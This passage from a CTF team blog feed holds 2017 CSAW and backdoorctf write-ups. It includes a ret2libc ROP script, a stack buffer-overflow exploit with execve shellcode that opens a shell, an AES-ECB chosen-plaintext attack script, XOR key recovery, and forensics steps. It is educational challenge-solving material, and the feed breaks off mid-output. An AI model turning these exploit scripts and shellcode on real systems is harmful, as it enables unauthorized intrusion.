class="line">log.info(<span class="string">"PRINTF 0x%x"</span> % PRINTF)</div><div class="line">log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</div><div class="line">log.info(<span class="string">"Binsh 0x%x"</span> % BINSH)</div><div class="line"></div><div class="line">ropchain2 = p32(SYSTEM) <span class="comment"># WRITE function "call"</span></div><div class="line">ropchain2 += <span class="string">'BBBB'</span> <span class="comment"># Return address doesn't really matter to where we return after shell</span></div><div class="line">ropchain2 += p32(BINSH)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">'Hello pwners, \n'</span>)</div><div class="line">r.sendline(<span class="string">'A'</span>*(<span class="number">112</span><span class="number">-8</span>)+ropchain2)</div><div class="line">r.recv()</div><div class="line">r.interactive()</div><div class="line">r.close()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a data-fancybox=&quot;gallery&quot; href=&quot;https://i.imgur.com/zgcdKZK.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://i.imgur.com/zgcdKZ
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
    
      <category term="ROP" scheme="https://teamrocketist.github.io/tags/ROP/"/>
    
      <category term="retToLibc" scheme="https://teamrocketist.github.io/tags/retToLibc/"/>
    
      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
    
  </entry>
  
  <entry>
    <title>[Forensics] CSAW - Best Router</title>
    <link href="https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Best-Router/"/>
    <id>https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Best-Router/</id>
    <published>2017-09-19T09:34:16.000Z</published>
    <updated>2017-09-26T19:18:07.658Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>    Best Router<br>    <a href="http://forensics.chal.csaw.io:3287" target="_blank" rel="external">http://forensics.chal.csaw.io:3287</a><br>    NOTE: This will expand to ~16GB!<br>    19:00 Eastern: updated. Old flags have been removed.<br></blockquote>

<p>Forensics challenge we have an img with 16GB, and an online service at <a href="http://forensics.chal.csaw.io:3287" target="_blank" rel="external">http://forensics.chal.csaw.io:3287</a>, the service asks for a username and a password so we guessed we need to find them in the img, so lets use autopsy to search in the linux filesystem for filenames that contain the word flag:<br><a data-fancybox="gallery" href="https://i.imgur.com/WBkVL6L.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/WBkVL6L.png" alt=""><br></a></p>
<p>As we can see we can found a <code>/var/www/flag.txt</code> unfortunately the file is empty, but we have the files of the web service of the link provided!<br><a data-fancybox="gallery" href="https://i.imgur.com/21qqjhh.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/21qqjhh.png" alt=""><br></a></p>
<p>Checking the username.txt and password.txt we can see that we have the username and password!<br><a data-fancybox="gallery" href="https://i.imgur.com/xCDzRDG.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/xCDzRDG.png" alt=""><br></a><br><a data-fancybox="gallery" href="https://i.imgur.com/ur0yCl6.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/ur0yCl6.png" alt=""><br></a></p>
<p>After using the credentials on the web page we got the flag!<br><a data-fancybox="gallery" href="https://i.imgur.com/b46URKw.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/b46URKw.png" alt=""><br></a></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;    Best Router&lt;br&gt;    &lt;a href=&quot;http://forensics.chal.csaw.io:3287&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://forensics.chal.csa
    
    </summary>
    
      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
    
    
      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="partitions" scheme="https://teamrocketist.github.io/tags/partitions/"/>
    
      <category term="disk" scheme="https://teamrocketist.github.io/tags/disk/"/>
    
      <category term="autopsy" scheme="https://teamrocketist.github.io/tags/autopsy/"/>
    
  </entry>
  
  <entry>
    <title>[Forensics] CSAW - Missed Registration</title>
    <link href="https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Missed-Registration/"/>
    <id>https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Missed-Registration/</id>
    <published>2017-09-19T09:34:16.000Z</published>
    <updated>2017-09-19T10:49:04.383Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Missed Registration<br><br>It’s registration day! These forms just seem longer and longer…<br><br>UPDATE 10:44 Eastern: New pcap that should be a bit easier to work with.<br><br>UPDATE 2:58 Eastern: We’re regenerating due to flag leaks, submissions disabled until then. Please be patient.<br><br>Update 3:31 Eastern: Updated pcap with new flag after leak. Please re-run your solutions on the file!<br><br><a href="https://ctf.csaw.io/files/bd2d3bcfdf09f06728d81d1a0cc0e4ff/cap.pcap" target="_blank" rel="external">https://ctf.csaw.io/files/bd2d3bcfdf09f06728d81d1a0cc0e4ff/cap.pcap</a><br></blockquote>

<p>We have a pcap file, at first we saw alot of <code>HTTP POST</code> requests:</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/O2U2weX.png" target="_blank" rel="external"><img src="https://i.imgur.com/O2U2weX.png" alt=""></a></p>
<p>A lot of the form fields were filled with crap information in latin, at first we thought the parameter n was encrypted or some other kind of binary we extracted but we found nothing. After awhile instead of looking at HTTP form URL encoded tab from writeshark we started looking at TCP segment data and we found a new post param, a “x” parameter that only showed up in some of the requests:<br><a data-fancybox="gallery" href="https://i.imgur.com/jEzYqZz.png" target="_blank" rel="external"><img src="https://i.imgur.com/jEzYqZz.png" alt=""></a></p>
<p>The very first HTTP POST requests has this value:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&amp;x=424d923500000000000036040000280000004301000027000000010008000000000000000000c40e0000c40e00000001000000010000000001ff0c0e10ff0d1012ff131719ff161d21ff1b2226ff1c2b33ff1f313bff24292bff252c31ff2a3338ff33393bff243742ff283741ff</div></pre></td></tr></table></figure>
<p>the beginning of this value “424d” indicated us that this might be an bmp image file! so we extracted all x’s values in one line bash command!:</p>
<figure class="highlight zsh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r cap.pcap -Y <span class="string">"http &amp;&amp; tcp.payload contains \"&amp;x=\""</span> -Tfields -e tcp.segment_data | tr -d <span class="string">':|\n'</span> | xxd -r -p | tr -d <span class="string">'x='</span> | xxd -r -p &gt; img.bmp</div></pre></td></tr></table></figure>
<p><a data-fancybox="gallery" href="https://i.imgur.com/Kr6Kxhh.png" target="_blank" rel="external"><img src="https://i.imgur.com/Kr6Kxhh.png" alt=""></a></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Missed Registration&lt;br&gt;&lt;br&gt;It’s registration day! These forms just seem longer and longer…&lt;br&gt;&lt;br&gt;UPDATE 10:44 Eastern: New 
    
    </summary>
    
      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
    
    
      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="pcap" scheme="https://teamrocketist.github.io/tags/pcap/"/>
    
      <category term="bmp" scheme="https://teamrocketist.github.io/tags/bmp/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] CSAW - Pilot</title>
    <link href="https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/"/>
    <id>https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/</id>
    <published>2017-09-18T20:58:25.000Z</published>
    <updated>2017-09-19T05:21:16.086Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>pilot<br><br>Can I take your order?<br><br>nc pwn.chal.csaw.io 8464<br><br>16:05 Eastern: Updated binary<br><br></blockquote>

<p>Simple bufferoverflow , we actually have a read size of <code>0x40</code> stack the binary doesn’t have any kind of protections so it’s a very easy one, just a simple buffer overflow, we even get the buffer address to jump!</p>
<p><img src="https://i.imgur.com/fA4rP6S.png" alt=""></p>
<p>The plan is:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1 - Caculate the offset to overflow.</div><div class="line">2 - Extract the address of the buffer.</div><div class="line">3 - Insert nops at the beginning and then shell code, the rest of the buffer fill it with A or any other values</div><div class="line">4 - Modify the return address with the value of the beginning of the buffer</div></pre></td></tr></table></figure>
<p>Visual representation of the stack!</p>
<p><img src="https://i.imgur.com/sXg37RZ.png" alt=""></p>
<p>How the stack looks like in gdb!</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/20g 0x7ffef1913660</div><div class="line">0x7ffef1913660:	0xbf48f63190909090	0xff978cd091969dd1  </div><div class="line">0x7ffef1913670:	0x573b04e6f7dff748	0x41414141050f5f54  </div><div class="line">0x7ffef1913680:	0x4141414141414141	0x00007ffef1913660</div></pre></td></tr></table></figure>
<p>The offset is 40 bytes to overflow the code is very simple</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> process(<span class="string">'pwn/pilot'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'pwn.chal.csaw.io'</span>, <span class="number">8464</span>)</div><div class="line"> </div><div class="line">binary = ELF(<span class="string">'pwn/pilot'</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">local = <span class="keyword">False</span></div><div class="line">r = getConn()</div><div class="line"><span class="comment">#db.attach(r, '''</span></div><div class="line"><span class="comment">#break *0x0000000000400b35</span></div><div class="line"><span class="comment">#c''')</span></div><div class="line">r.recvuntil(<span class="string">'[*]Good Luck Pilot!....\n'</span>)</div><div class="line"></div><div class="line">nops = <span class="string">'\x90'</span>*<span class="number">4</span></div><div class="line">shellcode =  <span class="string">"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"</span></div><div class="line">padding = <span class="string">'A'</span>* (<span class="number">40</span> - len(nops)- len(shellcode)) </div><div class="line">BUFFER = int(r.recvline()[<span class="number">12</span>:],<span class="number">0</span>)</div><div class="line">log.info(<span class="string">"LEAKED BUFFER 0x%x"</span> % BUFFER)</div><div class="line"></div><div class="line"></div><div class="line">r.recvuntil(<span class="string">'[*]Command:'</span>)</div><div class="line">r.sendline(nops+ shellcode + padding+ p64(BUFFER))</div><div class="line">r.interactive()</div><div class="line">r.close()</div></pre></td></tr></table></figure>
<p>Running it</p>
<figure class="highlight zsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">$ python pilot.py</div><div class="line">(.venvp) evilgod@Debian ~/D/H/c/csaw&gt; python pilot.py</div><div class="line">[*] <span class="string">'~/ctf/csaw/pwn/pilot'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">    RWX:      Has RWX segments</div><div class="line">[+] Opening connection to pwn.chal.csaw.io on port 8464: Done</div><div class="line">[*] LEAKED BUFFER 0x7ffc2562d050</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">pilot</div><div class="line">$ cat flag</div><div class="line">flag&#123;1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;pilot&lt;br&gt;&lt;br&gt;Can I take your order?&lt;br&gt;&lt;br&gt;nc pwn.chal.csaw.io 8464&lt;br&gt;&lt;br&gt;16:05 Eastern: Updated binary&lt;br&gt;&lt;br&gt;&lt;/blockquote
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
    
      <category term="shellcode" scheme="https://teamrocketist.github.io/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>Crypto-CSAW-CTF-2017-Baby-Crypt</title>
    <link href="https://teamrocketist.github.io/2017/09/18/Crypto-CSAW-CTF-2017-Baby-Crypt/"/>
    <id>https://teamrocketist.github.io/2017/09/18/Crypto-CSAW-CTF-2017-Baby-Crypt/</id>
    <published>2017-09-18T17:19:10.000Z</published>
    <updated>2017-09-19T05:11:05.812Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>baby_crypt<br>The cookie is input + flag AES ECB encrypted with the sha256 of the flag as the key.<br><br>nc crypto.chal.csaw.io 1578<br></blockquote>

<p>The first step that we took was to find out how many AES 16 byte blocks that the flag has.<br>To measure this we simply sent an empty request to the service.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">DiogoMonteiro @ ~/baby_crypt -&gt; nc crypto.chal.csaw.io 1578</div><div class="line">Enter your username (no whitespace):</div><div class="line">Your Cookie is: f9cc1330ae5830732a18d1a23211ffbce3725519adb9e6f10d658d87c80825ed</div></pre></td></tr></table></figure>
<p>At this stage, and having a hex string with 64 chars, we know that the flag has 32 bytes (including any padding).<br>Therefore, the flag represents two AES 16 byte blocks.</p>
<p>From the challenge description we know that the encryption is performed using AES ECB, which is vulnerable to chosen plaintext attacks. As a matter of fact, we have control over the first (any) bytes of the plaintext.<br>With a chosen plaintext attack on AES, to find the 32 bytes of the flag, we need to brute force each one of its bytes, resulting in a search space with size 32 x 94 = 3008 chars, which is easy.</p>
<p>The chosen plaintext attack that we performed works as follows. The idea is to input 32 bytes where the last byte is the one that we are going to brute force.</p>
<p>We start by sending to the service the input = AAAAAAAAAAAAAAAX (16 chars) for each char X in the range of printable chars, and store the resulting ciphertext of the second block in a dictionary D1.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">(X = byte to brute force, ! = byte of the secret, P = padding byte)</div><div class="line"></div><div class="line">| AAAAAAAAAAAAAAAA | AAAAAAAAAAAAAAAX | !!!!!!!!!!!!!!!! | !!!!!!!!!!!!!!!! | for each X in 0x20 to 0x7E</div><div class="line">| ---------------input ---------------| --------------secret ---------------|</div><div class="line"></div><div class="line">D1 = &#123;</div><div class="line">	&apos;cipher(AAAAAAAAAAAAAAAa)&apos;: &apos;a&apos;,</div><div class="line">	&apos;cipher(AAAAAAAAAAAAAAAb)&apos;: &apos;b&apos;,</div><div class="line">	...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>To find the first character of the flag, we compute the ciphertext of the second block with input = AAAAAAAAAAAAAAA (15 chars) and lookup for that ciphertext in the dictionary D1.</p>
<p>The next round is similar.<br>For each byte X in the range of printable chars we send input = AAAAAAAAAAAAAAfX (16 chars, and notice the previously found “f” char) to the server and store the resulting ciphertext of the second block in a dictionary D2.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">| AAAAAAAAAAAAAAAA | AAAAAAAAAAAAAAfX | !!!!!!!!!!!!!!!! | !!!!!!!!!!!!!!!P |</div><div class="line">| ---------------input ---------------|</div><div class="line"></div><div class="line">D2 = &#123;</div><div class="line">        &apos;cipher(AAAAAAAAAAAAAAfa)&apos;: &apos;a&apos;,</div><div class="line">        &apos;cipher(AAAAAAAAAAAAAAfb)&apos;: &apos;b&apos;,</div><div class="line">        ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Giving input = AAAAAAAAAAAAAAf to the server and looking up in the dictionary D2, we find the second letter of the flag.</p>
<p>And so on.</p>
<p>The following code implements the attack.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">conn = remote(<span class="string">"crypto.chal.csaw.io"</span>, <span class="number">1578</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(chosen)</span>:</span></div><div class="line">        conn.send(chosen + <span class="string">"\n"</span>)</div><div class="line">        <span class="keyword">return</span> conn.recvline().split(<span class="string">" "</span>)[<span class="number">-1</span>].rstrip(<span class="string">"\n"</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">second_block</span><span class="params">(blocks)</span>:</span></div><div class="line">        <span class="keyword">return</span> blocks[<span class="number">32</span>:<span class="number">64</span>]</div><div class="line"></div><div class="line"></div><div class="line">found = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</div><div class="line">        d = &#123;&#125;</div><div class="line">        b = (<span class="string">"A"</span> * (<span class="number">31</span>-j)) + found</div><div class="line"></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x7E</span>):</div><div class="line">                chosen = b + chr(i)</div><div class="line">                blocks = oracle(chosen)</div><div class="line">                d[second_block(blocks)] = chr(i)</div><div class="line">                <span class="keyword">print</span> <span class="string">"."</span>,</div><div class="line"></div><div class="line">        n = oracle(<span class="string">"A"</span> * (<span class="number">31</span>-j))</div><div class="line">        found += d[second_block(n)]</div><div class="line">	<span class="keyword">print</span> found</div><div class="line"></div><div class="line"><span class="keyword">print</span> found</div></pre></td></tr></table></figure>
<p>After running it, we get the flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">..............................................................................................</div><div class="line">f</div><div class="line">..............................................................................................</div><div class="line">fl</div><div class="line">..............................................................................................</div><div class="line">fla</div><div class="line">..............................................................................................</div><div class="line">flag</div><div class="line">..............................................................................................</div><div class="line">flag&#123;</div><div class="line">..............................................................................................</div><div class="line">flag&#123;C</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Cr</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Cry</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Cryp</div><div class="line">..............................................................................................</div><div class="line"></div><div class="line">(truncated output)</div><div class="line"></div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d0</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d0.</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d0..</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d0...</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d0...&#125;</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d0...&#125;</div></pre></td></tr></table></figure>
<p>Very fun challenge!</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;baby_crypt&lt;br&gt;The cookie is input + flag AES ECB encrypted with the sha256 of the flag as the key.&lt;br&gt;&lt;br&gt;nc crypto.chal.csa
    
    </summary>
    
      <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
    
    
      <category term="crypto" scheme="https://teamrocketist.github.io/tags/crypto/"/>
    
      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
    
      <category term="aes" scheme="https://teamrocketist.github.io/tags/aes/"/>
    
      <category term="ecb" scheme="https://teamrocketist.github.io/tags/ecb/"/>
    
  </entry>
  
  <entry>
    <title>[Crypto] CSAW 2017 - Another Xor</title>
    <link href="https://teamrocketist.github.io/2017/09/18/Crypto-CSAW-CTF-2017-Another-Xor/"/>
    <id>https://teamrocketist.github.io/2017/09/18/Crypto-CSAW-CTF-2017-Another-Xor/</id>
    <published>2017-09-18T16:46:30.000Z</published>
    <updated>2017-09-19T05:11:05.812Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Another Xor<br>Hey, hey can you find my secret.<br><br><a href="https://ctf.csaw.io/files/ef303796b276cd0bdf4f7c61b2606df5/cipher.py" target="_blank" rel="external">https://ctf.csaw.io/files/ef303796b276cd0bdf4f7c61b2606df5/cipher.py</a><br><a href="https://ctf.csaw.io/files/02a457c28ec0b04e5f7118e54ac8e138/encrypted" target="_blank" rel="external">https://ctf.csaw.io/files/02a457c28ec0b04e5f7118e54ac8e138/encrypted</a><br></blockquote>

<p>Our first attempt to solve this challenge was to use xortool. However, it was a dead end.</p>
<p>By looking at the given code we understand the cipher is just xoring with a repeated key. As a consequence, the second try was to perform a known-plaintext attack on recover a part of the key. We know the first bytes of the plaintext, which are “flag{“.We can xor the first 5 bytes of the ciphertext with “flag{“ to get the first 5 bytes of the key. The result is “A qua”.</p>
<p>The next step is to find the key length. We know that the last 16 bytes are from a hex encoded md5 hash, so our<br>strategy was to try several key lengths while decrypting with the bytes “A qua” that we know. By looking at the partial decrypted values we can find possible key lengths where the resulting chars are printable and the last ones are in hexadecimal.</p>
<p>The code used to find the key length was the following:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> open(<span class="string">"encrypted"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</div><div class="line">        c = f.read()</div><div class="line"></div><div class="line">key = <span class="string">"A qua"</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">5</span>, <span class="number">100</span>):</div><div class="line">        keyz = key + (<span class="string">"&lt;"</span> * (j - len(key)))</div><div class="line">        <span class="keyword">print</span></div><div class="line">        cz = <span class="string">""</span></div><div class="line">        <span class="keyword">print</span> <span class="string">"Trying with keysize of "</span> + str(len(keyz))</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</div><div class="line">                <span class="keyword">if</span> keyz[i%len(keyz)] != <span class="string">"&lt;"</span>:</div><div class="line">                        cz += chr(ord(c[i]) ^ ord(keyz[i%len(keyz)]))</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                        <span class="comment"># we still do not have that portion of the key</span></div><div class="line">                        cz += <span class="string">"?"</span></div><div class="line"></div><div class="line">        <span class="keyword">print</span> <span class="string">"plaintext: "</span> + cz[<span class="number">0</span>:len(cz)<span class="number">-32</span>-len(keyz)]</div><div class="line">        <span class="keyword">print</span> <span class="string">"key: "</span> + cz[len(cz)<span class="number">-32</span>-len(keyz): len(cz)<span class="number">-32</span>]</div><div class="line">        <span class="keyword">print</span> <span class="string">"md5: "</span> + cz[len(cz)<span class="number">-32</span>:]</div></pre></td></tr></table></figure>
<p>Key-length 67 was one of the few that the last 16 bytes were hex chars. We noticed this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">trying with keysize of 67</div><div class="line">plaintext: flag&#123;?????????????????????????????????</div><div class="line">key: ????????????????????????????? zinc?????????????????????????????????</div><div class="line">md5: ?????????????????????????????df2</div></pre></td></tr></table></figure>
<p>Lets try with key-length 67.<br>As the ciphertext contains the encryption of the key, it is possible to iteratively find more bytes of the key.<br>This is what implemented to find the flag:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> open(<span class="string">"encrypted"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</div><div class="line">        c = f.read()</div><div class="line"></div><div class="line">keyz = <span class="string">"A qua??????????????????????????????????????????????????????????????"</span></div><div class="line"><span class="keyword">print</span> <span class="string">"trying with key of length %d"</span> % len(keyz)</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="string">"?"</span> <span class="keyword">in</span> keyz:</div><div class="line">        cz = <span class="string">""</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</div><div class="line">                <span class="keyword">if</span> keyz[i%len(keyz)] != <span class="string">"?"</span>:</div><div class="line">                        cz += chr(ord(c[i]) ^ ord(keyz[i%len(keyz)]))</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                        cz += <span class="string">"?"</span></div><div class="line"></div><div class="line">        <span class="keyword">print</span> <span class="string">"Partial key --&gt; "</span> + keyz</div><div class="line"></div><div class="line">        ak = cz[len(cz)<span class="number">-32</span>-len(keyz): len(cz)<span class="number">-32</span>]</div><div class="line">        keyz = <span class="string">"A qua"</span> + ak[<span class="number">5</span>:]  <span class="comment"># the first 5 bytes we already know</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"plaintext: "</span> + cz[<span class="number">0</span>:len(cz)<span class="number">-32</span>-len(keyz)]</div><div class="line"><span class="keyword">print</span> keyz</div></pre></td></tr></table></figure>
<p>With this, we got the flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">trying with key of length 67</div><div class="line">Partial key --&gt; A qua??????????????????????????????????????????????????????????????</div><div class="line">Partial key --&gt; A qua???????????????????????? zinc?????????????????????????????????</div><div class="line">Partial key --&gt; A qua???????????????????????? zinc????????????????????????ht pa????</div><div class="line">Partial key --&gt; A qua???????????????ixed ???? zinc????????????????????????ht pa????</div><div 